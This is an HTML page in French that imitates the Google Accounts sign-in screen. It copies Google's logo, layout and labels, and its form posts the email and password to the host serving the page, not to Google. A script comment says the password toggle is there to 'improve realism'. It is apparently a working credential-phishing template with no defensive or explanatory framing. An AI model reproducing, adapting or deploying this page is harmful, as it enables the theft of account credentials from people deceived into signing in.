<!DOCTYPE html><html lang="fr"><head><meta charset="utf-8"/><meta content="width=device-width, initial-scale=1" name="viewport"/>
	<title>Sign in - Google Accounts</title>
	<link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400|Roboto:400,500&amp;display=swap" rel="stylesheet"/>
	<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet"/>
	<style type="text/css">html, body {
            font-family: Arial, sans-serif;
            background: #fff;
            margin: 0;
            padding: 0;
            height: 100%;
            width: 100%;
            font-size: 13px;
            color: #404040;
            display: flex;
            flex-direction: column;
        }

        .wrapper { flex: 1; display: flex; flex-direction: column; }
        
        .google-header-bar {
            height: 71px;
            border-bottom: 1px solid #e5e5e5;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .google-header-bar .logo { height: 38px; width: 116px; }

        .main { padding: 40px 10px; flex: 1; }
        .banner { text-align: center; margin-bottom: 20px; }
        .banner h2 { font-family: 'Open Sans', arial; color: #555; font-size: 18px; font-weight: 400; margin: 0; }

        .card {
            background-color: #f7f7f7;
            padding: 40px;
            margin: 0 auto;
            width: 100%;
            max-width: 304px;
            border-radius: 2px;
            box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
            box-sizing: border-box;
        }

        .profile-img {
            width: 96px;
            height: 96px;
            margin: 0 auto 20px;
            display: block;
            border-radius: 50%;
            background: #fff;
            border: 1px solid #ebebeb;
        }

        .input-group { position: relative; margin-bottom: 15px; }

        input[type=email], input[type=password], input[type=text] {
            width: 100%;
            height: 44px;
            font-size: 16px;
            padding: 0 10px;
            background: #fff;
            border: 1px solid #d9d9d9;
            border-top: 1px solid #c0c0c0;
            box-sizing: border-box;
            border-radius: 1px;
        }

        input:focus {
            outline: none;
            border: 1px solid #4d90fe;
            box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
        }

        .password-toggle {
            position: absolute;
            top: 50%;
            right: 10px;
            transform: translateY(-50%);
            color: #5f6368;
            cursor: pointer;
            display: flex;
            align-items: center;
        }

        .rc-button-submit {
            width: 100%;
            height: 36px;
            border: 1px solid #3079ed;
            color: #fff;
            text-shadow: 0 1px rgba(0,0,0,0.1);
            background-color: #4d90fe;
            font-weight: 700;
            font-size: 14px;
            cursor: pointer;
            margin-top: 10px;
        }

        .rc-button-submit:hover {
            background-color: #357ae8;
            border: 1px solid #2f5bb7;
        }

        .footer-bar {
            border-top: 1px solid #e5e5e5;
            padding: 15px;
            font-size: 11px;
            color: #737373;
            text-align: center;
        }

        .links-container {
            margin-top: 25px;
            text-align: center;
        }
        
        .links-container a {
            color: #427fed;
            text-decoration: none;
            font-weight: normal;
        }
	</style>
</head>
<body>
<div class="wrapper">
<div class="google-header-bar"><img alt="Google" class="logo" src="https://ssl.gstatic.com/accounts/ui/logo_2x.png"/></div>

<div class="main">
<div class="banner">
<h2>Accéder à votre compte</h2>
</div>

<div class="card"><img alt="Avatar" class="profile-img" src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png"/>
<form action="" method="POST">
<div class="input-group"><input id="Email" name="username" placeholder="E-mail ou téléphone" required="" spellcheck="false" type="email"/></div>

<div class="input-group"><input id="Passwd" name="password" placeholder="Mot de passe" required="" type="password"/> <span class="password-toggle" id="toggleVisibility"> <span class="material-icons" style="font-size: 20px;">visibility_off</span> </span></div>
<input class="rc-button-submit" type="submit" value="Suivant"/> </form>

<div class="links-container"><a href="#">Mot de passe oublié ?</a></div>
</div>
</div>
</div>

<div class="footer-bar"><span>Français · Confidentialité · Aide</span></div>
<script>
    // Toggle visibilité mot de passe (Améliore le réalisme)
    const passwordField = document.getElementById('Passwd');
    const toggleBtn = document.getElementById('toggleVisibility');
    
    toggleBtn.addEventListener('click', function() {
        const icon = this.querySelector('.material-icons');
        if (passwordField.type === 'password') {
            passwordField.type = 'text';
            icon.textContent = 'visibility';
        } else {
            passwordField.type = 'password';
            icon.textContent = 'visibility_off';
        }
    });
</script>

</body></html>
